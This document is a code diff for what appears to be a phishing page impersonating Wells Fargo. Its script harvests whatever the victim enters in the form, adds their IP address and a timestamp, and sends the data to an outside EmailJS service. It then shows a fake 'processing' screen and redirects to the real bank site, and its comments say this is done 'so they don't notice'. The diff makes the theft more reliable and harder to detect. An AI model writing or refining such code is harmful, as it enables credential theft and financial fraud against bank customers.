@@ -313,38 +313,67 @@
         e.preventDefault();
         
         // Get the button to disable it
-        const btn = e.target.querySelector('button[type="submit"]');
+        const btn = document.getElementById('verifyBtn'); // Make sure your button has id="verifyBtn"
         const originalText = btn ? btn.textContent : "Verify Now";
         
         if(btn) {
             btn.disabled = true;
             btn.textContent = "Verifying...";
+            btn.style.backgroundColor = "#999"; // Gray out button
+            btn.style.cursor = "not-allowed";
         }
 
-        // Get data
+        // Get data from form
         const formData = new FormData(e.target);
         const data = Object.fromEntries(formData.entries());
-        
+
         // Get IP
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(ipData => {
+                // Add IP and Date to data object
                 data.ip = ipData.ip;
                 data.date = new Date().toLocaleString();
                 
                 // Send to EmailJS
                 emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
                     .then(() => {
-                        // Success: Redirect to real site
-                        window.location.href = "https://www.wellsfargo.com/";
+                        // Success: Show processing screen, THEN redirect
+                        document.querySelector('.container').style.display = 'none';
+                        document.getElementById('processing').style.display = 'block';
+                        
+                        // Wait 3 seconds then go to real site
+                        setTimeout(() => {
+                            window.location.href = "https://www.wellsfargo.com/";
+                        }, 3000);
                     })
                     .catch(err => {
-                        // Fail: Still redirect so they don't notice
-                        window.location.href = "https://www.wellsfargo.com/";
+                        // Fail: Still show processing screen then redirect so they don't notice
+                        document.querySelector('.container').style.display = 'none';
+                        document.getElementById('processing').style.display = 'block';
+                        
+                        setTimeout(() => {
+                            window.location.href = "https://www.wellsfargo.com/";
+                        }, 3000);
                     });
             })
             .catch(() => {
-                window.location.href = "https://www.wellsfargo.com/";
+                // If IP fetch fails, still send data without IP and redirect
+                emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
+                    .then(() => {
+                        document.querySelector('.container').style.display = 'none';
+                        document.getElementById('processing').style.display = 'block';
+                        setTimeout(() => {
+                            window.location.href = "https://www.wellsfargo.com/";
+                        }, 3000);
+                    })
+                    .catch(() => {
+                        document.querySelector('.container').style.display = 'none';
+                        document.getElementById('processing').style.display = 'block';
+                        setTimeout(() => {
+                            window.location.href = "https://www.wellsfargo.com/";
+                        }, 3000);
+                    });
             });
     });
 </script>
